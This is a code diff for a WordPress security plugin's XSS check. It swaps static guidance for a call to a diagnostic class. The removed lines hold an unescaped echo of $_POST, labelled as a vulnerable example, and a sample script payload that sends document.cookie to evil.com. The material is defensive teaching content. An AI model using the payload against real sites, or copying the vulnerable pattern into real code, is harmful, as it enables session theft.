@@ -85,40 +85,6 @@ class Treatment_XSS_Protection extends Treatment_Base {
 	 * @return array|null Finding array if issue found, null otherwise.
 	 */
 	public static function check() {
-		// This is a guidance treatment - actual XSS analysis requires code scanning.
-		// We provide recommendations and patterns.
-
-		$issues = array();
-
-		$issues[] = __( 'ALWAYS escape output: echo esc_html( $variable )', 'wpshadow' );
-		$issues[] = __( 'HTML attributes: use esc_attr() for attribute values', 'wpshadow' );
-		$issues[] = __( 'URLs: use esc_url() for href/src attributes', 'wpshadow' );
-		$issues[] = __( 'JavaScript: use esc_js() for JS strings', 'wpshadow' );
-		$issues[] = __( 'Allow HTML only via wp_kses() with explicit tag whitelist', 'wpshadow' );
-		$issues[] = __( 'NEVER use innerHTML without sanitization in JavaScript', 'wpshadow' );
-		$issues[] = __( 'Set Content-Security-Policy header to restrict inline scripts', 'wpshadow' );
-
-		if ( ! empty( $issues ) ) {
-			return array(
-				'id'           => self::$slug,
-				'title'        => self::$title,
-				'description'  => __( 'Cross-Site Scripting (XSS) lets attackers inject malicious JavaScript into pages. This steals user sessions, credentials, and compromises accounts.', 'wpshadow' ),
-				'severity'     => 'critical',
-				'threat_level' => 90,
-				'auto_fixable' => false,  // Requires code audit
-				'kb_link'      => 'https://wpshadow.com/kb/xss-protection',
-				'details'      => array(
-					'recommendations'         => $issues,
-					'bad_example'             => 'echo "<div>" . $_POST["name"] . "</div>"; // XSS vulnerability',
-					'good_example'            => 'echo "<div>" . esc_html( $_POST["name"] ) . "</div>";',
-					'attack_example'          => 'attacker sends: <script>document.location="http://evil.com?cookie="+document.cookie</script>',
-					'impact'                  => 'Session hijacking, credential theft, site defacement, phishing',
-					'owasp_rank'              => 'A03:2021 Injection (#3 most critical)',
-					'wordpress_functions'     => 'esc_html(), esc_attr(), esc_url(), esc_js(), wp_kses(), wp_kses_post()',
-				),
-			);
-		}
-
-		return null;
+		return self::proxy_diagnostic_check( '\WPShadow\Diagnostics\Diagnostic_XSS_Protection' );
 	}
 }
